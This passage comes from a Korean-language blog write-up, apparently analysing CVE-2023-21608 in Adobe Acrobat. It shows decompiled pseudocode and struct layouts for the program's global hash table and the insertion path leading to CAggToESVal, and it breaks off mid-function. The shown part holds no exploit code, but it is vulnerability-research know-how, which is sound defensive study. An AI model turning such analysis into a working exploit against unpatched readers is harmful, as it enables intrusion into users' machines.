<span class="hljs-symbol">00000008 </span><span class="hljs-keyword">Data</span>            dd ?                    
<span class="hljs-symbol">00000008 </span>                                        
<span class="hljs-number">0000000</span>C field_C         dd ?                    
<span class="hljs-symbol">00000010 </span>HashBucketEntry ends
<span class="hljs-number">00000010</span>
<span class="hljs-symbol">00000000 </span>; ---------------------------------------------------------------------------
<span class="hljs-number">00000000</span>
<span class="hljs-symbol">00000000 </span>HashTable       struc ; (sizeof=<span class="hljs-number">0</span>x30, mappedto_224)
<span class="hljs-symbol">00000000 </span>                                        
<span class="hljs-symbol">00000000 </span>unknown0        dd ?
<span class="hljs-symbol">00000004 </span>DefaultHead     dd ?                    
<span class="hljs-symbol">00000004 </span>                                        
<span class="hljs-symbol">00000008 </span>length          dd ?
<span class="hljs-number">0000000</span>C HashBuckets     HashBucketTable ?       
<span class="hljs-symbol">00000020 </span>field_20        dd ?                    
<span class="hljs-symbol">00000020 </span>                                        
<span class="hljs-symbol">00000024 </span>field_24        dd ?
<span class="hljs-symbol">00000028 </span>field_28        dd ?                    
<span class="hljs-symbol">00000028 </span>                                        
<span class="hljs-number">0000002</span>C field_2C        dd ?                    
<span class="hljs-number">0000002</span>C                                         
<span class="hljs-symbol">00000030 </span>HashTable       ends
<span class="hljs-number">00000030</span>
<span class="hljs-symbol">00000000 </span>; ---------------------------------------------------------------------------
<span class="hljs-number">00000000</span>
<span class="hljs-symbol">00000000 </span>HashBucketTable struc ; (sizeof=<span class="hljs-number">0</span>x14, mappedto_227)
<span class="hljs-symbol">00000000 </span>                                        
<span class="hljs-symbol">00000000 </span>HashBucketBegin dd ?                    
<span class="hljs-symbol">00000004 </span>HashBucketEnd   dd ?                    
<span class="hljs-symbol">00000008 </span>HashBucketUnknown dd ?                  
<span class="hljs-number">0000000</span>C BucketMaxIndex  dd ?
<span class="hljs-symbol">00000010 </span>BucketCount     dd ?
<span class="hljs-symbol">00000014 </span>HashBucketTable ends
<span class="hljs-number">00000014</span>
<span class="hljs-symbol">00000000 </span>; ---------------------------------------------------------------------------
<span class="hljs-number">00000000</span>
<span class="hljs-symbol">00000000 </span>HashBucketEntryHeader struc ; (sizeof=<span class="hljs-number">0</span>x8, mappedto_228)
<span class="hljs-symbol">00000000 </span>                                        
<span class="hljs-symbol">00000000 </span>BucketHead      dd ?                    
<span class="hljs-symbol">00000004 </span>BucketTail      dd ?                    
<span class="hljs-symbol">00000008 </span>HashBucketEntryHeader ends
<span class="hljs-number">00000008</span>
<span class="hljs-symbol">00000000 </span>; ---------------------------------------------------------------------------
<span class="hljs-number">00000000</span>
<span class="hljs-symbol">00000000 </span>union1          union ; (sizeof=<span class="hljs-number">0</span>x8, mappedto_229)
<span class="hljs-symbol">00000000 </span>                                        
<span class="hljs-symbol">00000000 </span>                                        
<span class="hljs-symbol">00000000 </span>list_entry      ListEntry ?
<span class="hljs-symbol">00000000 </span>entry_header    HashBucketEntryHeader ?
<span class="hljs-symbol">00000000 </span>union1          ends
<span class="hljs-number">00000000</span></code></pre>
<p><code>HashTable</code>&#xC740; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14; &#xAD6C;&#xD604;&#xC744; &#xC704;&#xD55C; &#xAD6C;&#xC870;&#xCCB4;&#xB85C; <code>HashTable.DefaultHead</code>&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xB418;&#xB294; &#xC6D0;&#xD615; &#xC774;&#xC911; &#xC5F0;&#xACB0; &#xB9AC;&#xC2A4;&#xD2B8;&#xB85C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAD00;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC6D0;&#xD615; &#xC774;&#xC911; &#xC5F0;&#xACB0; &#xB9AC;&#xC2A4;&#xD2B8;&#xB294; <code>HashBucketEntry</code> &#xAD6C;&#xC870;&#xCCB4;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC838; &#xC788;&#xC73C;&#xBA70; &#xC6D0;&#xD615; &#xC5F0;&#xACB0; &#xB9AC;&#xC2A4;&#xD2B8;&#xC758; &#xC5F0;&#xC18D;&#xC801;&#xC778; &#xC77C;&#xBD80;&#xBD84;&#xC774; &#xAC01;&#xAC01;&#xC758; &#xBC84;&#xD0B7;&#xC774; &#xB418;&#xC5B4; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p>
<p>&#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xC774;&#xB8E8;&#xB294; &#xBC84;&#xD0B7;&#xB4E4;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB294; <code>HashBucketTable</code> &#xAD6C;&#xC870;&#xCCB4;&#xC778; <code>HashTable.HashBuckets</code>&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xACE0; <code>HashBucketTable.HashBucketBegin</code>&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC8FC;&#xC18C;&#xBD80;&#xD130; <code>HashBucketTable.HashBucketEnd</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC8FC;&#xC18C;&#xAE4C;&#xC9C0; <code>HashBucketTable.BucketCount</code> &#xAE38;&#xC774;&#xC758; <code>HashBucketEntryHeader</code> &#xBC30;&#xC5F4;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xAD6C;&#xC870;&#xB97C; &#xADF8;&#xB9BC;&#xC73C;&#xB85C; &#xB098;&#xD0C0;&#xB0B4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%203.png" srcset="/img/loading.gif" alt="Untitled"></p>
<p><code>HashBucketEntryHeader</code> &#xBC30;&#xC5F4;&#xC5D0;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC6D0;&#xD615; &#xC774;&#xC911; &#xC5F0;&#xACB0; &#xB9AC;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xBC84;&#xD0B7;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC5F0;&#xC18D;&#xB41C; &#xB178;&#xB4DC;&#xB4E4;&#xC744; &#xC774;&#xC911; &#xC5F0;&#xACB0; &#xB9AC;&#xC2A4;&#xD2B8;&#xB85C; &#xAD00;&#xB9AC;&#xD558;&#xACE0; &#xC774; &#xC5F0;&#xACB0; &#xB9AC;&#xC2A4;&#xD2B8;&#xC758; Head&#xC640; Tail &#xB178;&#xB4DC;&#xB97C; <code>BucketHead</code>&#xC640; <code>BucketTail</code>&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xBE44;&#xC5B4;&#xC788;&#xB294; &#xBC84;&#xD0B7;&#xC758; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; <code>BucketHead</code>&#xC640; <code>BucketTail</code>&#xC774; &#xBAA8;&#xB450; <code>HashTable.DefaultHead</code>&#xC785;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%204.png" srcset="/img/loading.gif" alt="Untitled"></p>
<p>&#xC704;&#xC640; &#xAC19;&#xC740; &#xB0B4;&#xC6A9;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xBA74;&#xC11C; &#xC815;&#xB9D0; &#xC624;&#xB79C;&#xB9CC;&#xC5D0; &#xB9AC;&#xBC84;&#xC2F1;&#xC774; &#xC7AC;&#xBBF8;&#xC788;&#xB294; &#xC21C;&#xAC04;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;&#xB9CC;&#x2026; &#xC790;&#xC8FC; &#xD558;&#xACE0; &#xC2F6;&#xC9C4; &#xC54A;&#xAD70;&#xC694;&#x2026; </p>
<p>&#xBB34;&#xD2BC; &#xC774;&#xB7EC;&#xD55C; &#xAD6C;&#xC870;&#xB97C; &#xAC16;&#xB294; <code>HashTable</code>&#xC744; &#xC778;&#xC790;&#xB85C; &#xD638;&#xCD9C;&#xB41C; <code>sub_20AD638B</code>&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<h3 id="sub-20AD638B"><a href="#sub-20AD638B" class="headerlink" title="sub_20AD638B"></a>sub_20AD638B</h3><pre><code class="hljs c"><span class="hljs-function">ListEntry *__thiscall <span class="hljs-title">sub_20AD638B</span><span class="hljs-params">(HashTable *hashTable, ListEntry *a2, _DWORD *pData)</span></span>
<span class="hljs-function"></span>{
  <span class="hljs-keyword">int</span> DataHash; <span class="hljs-comment">// eax</span>
  HashBucketEntry *v5; <span class="hljs-comment">// ecx</span>
  ListEntry *result; <span class="hljs-comment">// eax</span>
  ListEntry returnPtr; <span class="hljs-comment">// [esp+4h] [ebp-8h] BYREF</span>

  DataHash = hashFunction(<span class="hljs-number">0x811C9DC5</span>, pData, <span class="hljs-number">4u</span>);
  v5 = FindDataFromHashTable(hashTable, &amp;returnPtr, pData, DataHash)-&gt;Blink;
  <span class="hljs-keyword">if</span> ( !v5 )
    v5 = hashTable-&gt;DefaultHead;
  result = a2;
  a2-&gt;Flink = v5;                              
  <span class="hljs-keyword">return</span> result;
}</code></pre>
<p>&#xBA3C;&#xC800; &#xC544;&#xB798;&#xC758; <code>hashFunction</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xC5EC; <code>pData</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD574;&#xC2F1;&#xD569;&#xB2C8;&#xB2E4;. </p>
<pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">hashFunction</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, _BYTE *a2, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> len)</span></span>
<span class="hljs-function"></span>{
  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// edx</span>

  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; len; ++i )
    a1 = <span class="hljs-number">0x1000193</span> * (a1 ^ (<span class="hljs-keyword">unsigned</span> __int8)a2[i]);
  <span class="hljs-keyword">return</span> a1;
}</code></pre>
<p>&#xC774;&#xD6C4; <code>hashFunction</code>&#xC774; &#xBC18;&#xD658;&#xD55C; <code>DataHash</code>&#xB97C; &#xC778;&#xC790;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; <code>FindDataFromHashTable</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p>
<h3 id="FindDataFromHashTable"><a href="#FindDataFromHashTable" class="headerlink" title="FindDataFromHashTable"></a>FindDataFromHashTable</h3><pre><code class="hljs c"><span class="hljs-function">ListEntry *__thiscall <span class="hljs-title">FindDataFromHashTable</span><span class="hljs-params">(HashTable *hashTable, ListEntry *returnPtr, _DWORD *pData, <span class="hljs-keyword">int</span> DataHash)</span></span>
<span class="hljs-function"></span>{
  <span class="hljs-keyword">int</span> idx; <span class="hljs-comment">// eax</span>
  HashBucketEntryHeader *v5; <span class="hljs-comment">// esi</span>
  HashBucketEntry *v6; <span class="hljs-comment">// ecx</span>
  HashBucketEntry *v7; <span class="hljs-comment">// edx</span>
  ListEntry *result; <span class="hljs-comment">// eax</span>

  idx = DataHash &amp; hashTable-&gt;HashBuckets.BucketMaxIndex;<span class="hljs-comment">// Hash &amp; 7</span>
  v5 = hashTable-&gt;HashBuckets.HashBucketBegin;  
  v6 = hashTable-&gt;DefaultHead;                  <span class="hljs-comment">// default header</span>
  v7 = v5[idx].BucketTail;                     
  <span class="hljs-keyword">if</span> ( v7 == v6 )                               <span class="hljs-comment">// bucket is empty</span>
  {
    result = returnPtr;
    returnPtr-&gt;Blink = <span class="hljs-number">0</span>;
LABEL_8:
    result-&gt;Flink = v6;
  }
  <span class="hljs-keyword">else</span>
  {
    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )                                 <span class="hljs-comment">// Traverse Bucket(doubly linked list)</span>
                                                <span class="hljs-comment">// from Tail to Head</span>
    {
      <span class="hljs-keyword">if</span> ( *pData == v7-&gt;Data )                 <span class="hljs-comment">// Data Found</span>
      {
        result = returnPtr;
        v6 = v7-&gt;list_entry.list_entry.Flink;
        returnPtr-&gt;Blink = v7;                  <span class="hljs-comment">// returnPtr-&gt;Filnk = found-&gt;Flink</span>
                                                <span class="hljs-comment">// returnPtr-&gt;Blink = found</span>
        <span class="hljs-keyword">goto</span> LABEL_8;
      }
      <span class="hljs-keyword">if</span> ( v7 == v5[idx].BucketHead )
        <span class="hljs-keyword">break</span>;
      v7 = v7-&gt;list_entry.list_entry.Blink;
    }
    result = returnPtr;
    returnPtr-&gt;Blink = <span class="hljs-number">0</span>;
    returnPtr-&gt;Flink = v7;
  }
  <span class="hljs-keyword">return</span> result;                                <span class="hljs-comment">// Data not found</span>
                                                <span class="hljs-comment">// </span>
                                                <span class="hljs-comment">// returnPtr-&gt;Flink = BucketHead</span>
                                                <span class="hljs-comment">// returnPtr-&gt;Blink = NULL;</span>
}</code></pre>
<p>&#xC774; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xBA3C;&#xC800; <code>DataHash</code>&#xB97C; &#xD1B5;&#xD574; &#xD0D0;&#xC0C9;&#xD560; <code>HashBucketEntryHeader</code>&#xB97C; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;. &#xD0D0;&#xC0C9;&#xC740; <code>BucketTail</code>&#xBD80;&#xD130; <code>Blink</code>&#xB97C; &#xB530;&#xB77C; <code>BucketHead</code>&#xC5D0; &#xB3C4;&#xB2EC;&#xD560; &#xB54C;&#xAE4C;&#xC9C0; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xACE0; &#xB9CC;&#xC57D; <code>BucketTail</code>&#xC774; <code>DefaultHead</code>&#xC778; &#xACBD;&#xC6B0; &#xD574;&#xB2F9; &#xBC84;&#xD0B7;&#xC740; &#xBE44;&#xC5B4;&#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC774;&#xAE30;&#xC5D0; &#xD0D0;&#xC0C9;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p>&#xBC84;&#xD0B7;&#xC774; &#xBE44;&#xC5B4;&#xC788;&#xC9C0; &#xC54A;&#xB2E4;&#xBA74; &#xD0D0;&#xC0C9; &#xACB0;&#xACFC;&#xB97C; &#xB450; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xB41C; <code>returnPtr</code>&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p>
<p> &#xBC84;&#xD0B7;&#xC774; &#xBE44;&#xC5B4;&#xC788;&#xB294; &#xACBD;&#xC6B0;&#xB098; &#xBC84;&#xD0B7;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC5C6;&#xB294; &#xACBD;&#xC6B0;, <code>returnPtr-&gt;Flink</code>&#xC640; <code>returnPtr-&gt;Blink</code>&#xC5D0; &#xAC01;&#xAC01; <code>BucketHead</code>&#xC640; <code>NULL</code>&#xC774; &#xC800;&#xC7A5;&#xB418;&#xACE0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xCC3E;&#xC740; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xD574;&#xB2F9; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xC788;&#xB294; &#xB178;&#xB4DC;&#xC758; <code>Flink</code>&#xC640; &#xB178;&#xB4DC;&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xAC01;&#xAC01; <code>returnPtr-&gt;Flink</code>&#xC640; <code>returnPtr-&gt;Blink</code>&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xBC18;&#xD658;&#xB429;&#xB2C8;&#xB2E4;.</p>
<p><code>sub_20AD638B</code>&#xC5D0;&#xC11C;&#xB294; <code>FindDataFromHashTable</code>&#xC5D0;&#xC11C; &#xD0D0;&#xC0C9; &#xACB0;&#xACFC;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xACE0; &#xBC18;&#xD658;&#xB41C; <code>returnPtr</code>&#xC758; <code>Blink</code>&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xC5EC; &#xC774; &#xAC12;&#xC774; <code>NULL</code>&#xC778;(HashTable&#xC5D0; &#xD574;&#xB2F9; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294;) &#xACBD;&#xC6B0; &#xB450; &#xBC88;&#xC9F8; &#xC778;&#xC790; <code>a2</code>&#xC758; <code>Flink</code>&#xC5D0; <code>hashTable-&gt;DefaultHead</code>&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs c">v5 = FindDataFromHashTable(hashTable, &amp;returnPtr, pData, DataHash)-&gt;Blink;
<span class="hljs-keyword">if</span> ( !v5 )
  v5 = hashTable-&gt;DefaultHead;
result = a2;
a2-&gt;Flink = v5;                              
<span class="hljs-keyword">return</span> result;</code></pre>
<p>&#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; <code>IsDataInGlobalHashTable</code> &#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>GlobalHashTable</code>&#xC5D0; <code>Data</code>&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xC6B0; &#xBC18;&#xD658;&#xB418;&#xB294; &#xB178;&#xB4DC;&#xC758; &#xC8FC;&#xC18C;&#xB098; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC5C6;&#xB294; &#xACBD;&#xC6B0;&#xC5D0; &#xBC18;&#xD658;&#xB418;&#xB294; <code>GlobalHashTable.DefaultHead</code>&#xB97C; <code>GlobalHashTable.DefaultHead</code>&#xC640; &#xBE44;&#xAD50;&#xD558;&#xACE0; &#xC774; &#xACB0;&#xACFC;&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs c"><span class="hljs-keyword">return</span> Data &amp;&amp; sub_20AD638B(&amp;GlobalHashTable, (ListEntry *)&amp;a2, (<span class="hljs-keyword">int</span>)&amp;Data)-&gt;Flink != GlobalHashTable.DefaultHead;
<span class="hljs-comment">//if Data is in GlobalHashTable, then Node&apos;s Addr != GlobalHashTable.</span>
<span class="hljs-comment">//=&gt; return true</span>
<span class="hljs-comment">//else return false</span></code></pre>
<p>&#xB530;&#xB77C;&#xC11C; <code>GetRichValueEventProp</code>&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>PointerType</code>&#xC774; <code>GlobalHashTable</code>&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xACBD;&#xC6B0;&#xC5D0;&#xB9CC; <code>CAggToESVal</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xBD84;&#xAE30;&#xB85C; &#xC9C4;&#xC785;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs c"><span class="hljs-keyword">if</span> ( PointerType )
{
  LOBYTE(PointerType) = IsDataInGlobalHashTable(PointerType);
  <span class="hljs-keyword">if</span> ( !(_BYTE)PointerType )
  {
    v15 = InsertToGlobalHashTable((<span class="hljs-keyword">int</span>)&amp;v31, PointerType_1);
    LOBYTE(v33) = <span class="hljs-number">4</span>;
    CAggToESVal((<span class="hljs-keyword">int</span>)v15, v16, PropName, PointerType_1);
    PointerType = DeleteFromGlobalHashTable((<span class="hljs-keyword">int</span>)&amp;v31);
  }
}</code></pre>
<p>&#xC544;&#xB798;&#xB294; <code>CAggToESVal</code> &#xC774;&#xC804;&#xC5D0; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>InsertToGlobalHashTable</code>&#xD568;&#xC218;&#xC758; &#xBD84;&#xC11D;&#xC785;&#xB2C8;&#xB2E4;.</p>
<h2 id="InsertToGlobalHashTable"><a href="#InsertToGlobalHashTable" class="headerlink" title="InsertToGlobalHashTable"></a>InsertToGlobalHashTable</h2><pre><code class="hljs c"><span class="hljs-function">_DWORD *__thiscall <span class="hljs-title">InsertToGlobalHashTable</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1, <span class="hljs-keyword">int</span> Data)</span></span>
<span class="hljs-function"></span>{
  <span class="hljs-keyword">int</span> v4[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [esp+4h] [ebp-8h] BYREF</span>

  <span class="hljs-keyword">if</span> ( Data )
  {
    InsertIfNotPresent(&amp;GlobalHashTable, (ListEntry *)v4, (<span class="hljs-keyword">int</span>)&amp;Data)-&gt;Flink-&gt;field_C = <span class="hljs-number">1</span>;
    *(_DWORD *)a1 = Data;
  }
  <span class="hljs-keyword">return</span> (_DWORD *)a1;
}</code></pre>
<p><code>GlobalHashTable</code>&#xACFC; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xCD94;&#xAC00;&#xD560; &#xB370;&#xC774;&#xD130;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC778;&#xC790;&#xB85C; <code>InsertIfNotPresent</code>&#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xD638;&#xCD9C;&#xB41C; &#xD568;&#xC218;&#xAC00; &#xBC18;&#xD658;&#xB418;&#xBA74; &#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790; <code>a1</code>&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC8FC;&#xC18C;&#xC5D0; <code>Data</code>&#xB97C; &#xC4F0;&#xACE0; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p>
<h3 id="InsertIfNotPresent"><a href="#InsertIfNotPresent" class="headerlink" title="InsertIfNotPresent"></a>InsertIfNotPresent</h3><pre><code class="hljs c"><span class="hljs-function">ListEntry *__thiscall <span class="hljs-title">InsertIfNotPresent</span><span class="hljs-params">(HashTable *hashTable, ListEntry *a2, <span class="hljs-keyword">int</span> *pData)</span></span>
<span class="hljs-function"></span>{
  <span class="hljs-keyword">int</span> DataHash; <span class="hljs-comment">// ebx</span>
  ListEntry *result; <span class="hljs-comment">// eax</span>
  HashBucketEntry *newBucketEntry; <span class="hljs-comment">// edi</span>
  HashBucketEntry *BucketHead; <span class="hljs-comment">// ecx</span>
  HashBucketEntry *v8; <span class="hljs-comment">// eax</span>
  <span class="hljs-keyword">bool</span> v9; <span class="hljs-comment">// zf</span>
  ListEntry findResult; <span class="hljs-comment">// [esp+10h] [ebp-24h] BYREF</span>
  HashBucketEntry v11; <span class="hljs-comment">// [esp+18h] [ebp-1Ch] BYREF</span>
  <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// [esp+30h] [ebp-4h]</span>

  DataHash = hashFunction(<span class="hljs-number">0x811C9DC5</span>, pData, <span class="hljs-number">4u</span>);
  FindDataFromHashTable(hashTable, &amp;findResult, pData, DataHash);
  <span class="hljs-keyword">if</span> ( findResult.Blink )                       <span class="hljs-comment">// Data is present in HashTable, no insertion</span>
  {
    result = a2;
    a2-&gt;Flink = findResult.Blink;
    LOBYTE(a2-&gt;Blink) = <span class="hljs-number">0</span>;
  }
  <span class="hljs-keyword">else</span>                                          <span class="hljs-comment">// Data is not present -&gt; insertion occurs</span>
  {
    hashTableLengthCheck(hashTable);
    v11.Data = (<span class="hljs-keyword">int</span>)pData;
    AllocateNewNode(&amp;v11, (HashBucketEntry *)&amp;hashTable-&gt;DefaultHead, &amp;dword_2100AE5C, (<span class="hljs-keyword">int</span>)&amp;v11.Data);<span class="hljs-comment">// allocate new node</span>
                                                <span class="hljs-comment">// v11.list_entry.list_entry.blink = new_node</span>
    v12 = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">if</span> ( IsBucketExpandNeeded(hashTable) )
    {
      expandHashTable(hashTable);
      newBucketEntry = v11.list_entry.list_entry.Blink;
      BucketHead = FindDataFromHashTable(hashTable, &amp;findResult, &amp;v11.list_entry.list_entry.Blink-&gt;Data, DataHash)-&gt;Flink;
    }
    <span class="hljs-keyword">else</span>
    {
      BucketHead = findResult.Flink;
      newBucketEntry = v11.list_entry.list_entry.Blink;
    }
    v11.list_entry.list_entry.Blink = <span class="hljs-number">0</span>;
    v8 = InsertIntoHashTable(hashTable, DataHash, BucketHead, newBucketEntry);
    v9 = v11.list_entry.list_entry.Blink == <span class="hljs-number">0</span>;
    a2-&gt;Flink = v8;
    LOBYTE(a2-&gt;Blink) = <span class="hljs-number">1</span>;
    <span class="hljs-keyword">if</span> ( !v9 )
      sub_20867B89(v11.list_entry.list_entry.Blink);
    result = a2;
  }
  <span class="hljs-keyword">return</span> result;
}</code></pre>
<p>&#xC774; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; <code>hashFunction</code>&#xACFC; <code>FindDataFromHashTable</code>&#xB85C; &#xBA3C;&#xC800; &#xC0BD;&#xC785;&#xD560; &#xB370;&#xC774;&#xD130;&#xAC00; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xBBF8; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xC6B0; <code>findResult.Blink</code>&#xAC00; <code>NULL</code>&#xC774; &#xC544;&#xB2CC; &#xAC12;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xAE30;&#xC5D0; <code>if</code>&#xB85C; &#xBD84;&#xAE30;&#xD558;&#xC5EC; &#xC0BD;&#xC785; &#xACFC;&#xC815; &#xC5C6;&#xC774; &#xD568;&#xC218;&#xAC00; &#xBC18;&#xD658;&#xB418;&#xACE0; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xC0BD;&#xC785;&#xD560; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC5C6;&#xB294; &#xACBD;&#xC6B0; <code>else</code>&#xB85C; &#xBD84;&#xAE30;&#xD558;&#xC5EC; &#xB370;&#xC774;&#xD130;&#xC758; &#xC0BD;&#xC785;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p>
<p><code>else</code> &#xBD84;&#xAE30;&#xC5D0;&#xC11C;&#xB294; <code>AllocateNewNode</code>&#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xC5B4; <code>Data</code>&#xC5D0; <code>*pData</code>&#xAC00; &#xC800;&#xC7A5;&#xB41C; &#xC0C8;&#xB85C;&#xC6B4; &#xB178;&#xB4DC;&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xACE0; <code>findResult.Flink</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC0BD;&#xC785;&#xB420; &#xBC84;&#xD0B7;&#xC758; <code>Head</code>&#xC8FC;&#xC18C;&#xC640; &#xD560;&#xB2F9;&#xB41C; &#xB178;&#xB4DC;&#xB97C; &#xC778;&#xC790;&#xB85C; <code>InsertIntoHashTable</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p>
<h3 id="InsertIntoHashTable"><a href="#InsertIntoHashTable" class="headerlink" title="InsertIntoHashTable"></a>InsertIntoHashTable</h3><p><code>InsertIntoHashTable</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>target-&gt;Blink</code>&#xC5D0; <code>newNode</code>&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xB294; &#xB3D9;&#xC791;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs c"><span class="hljs-function">HashBucketEntry *__thiscall <span class="hljs-title">InsertIntoHashTable</span><span class="hljs-params">(HashTable *hashTable, <span class="hljs-keyword">int</span> DataHash, HashBucketEntry *target, HashBucketEntry *newNode)</span></span>
<span class="hljs-function"></span>{
  HashBucketEntry *tmp; <span class="hljs-comment">// ebx</span>
  <span class="hljs-keyword">int</span> idx; <span class="hljs-comment">// edx</span>
  HashBucketEntryHeader *v6; <span class="hljs-comment">// esi</span>
  HashBucketEntry *result; <span class="hljs-comment">// eax</span>

  tmp = target-&gt;list_entry.list_entry.Blink;
  ++hashTable-&gt;length;                          <span class="hljs-comment">// Increase Length</span>
  newNode-&gt;list_entry.list_entry.Flink = target;
  newNode-&gt;list_entry.list_entry.Blink = tmp;
  tmp-&gt;list_entry.list_entry.Flink = newNode;
  target-&gt;list_entry.list_entry.Blink = newNode;<span class="hljs-comment">// </span>
  <span class="hljs-comment">// Blink: &lt;-</span>
  <span class="hljs-comment">// Flink: -&gt;</span>
  <span class="hljs-comment">// </span>
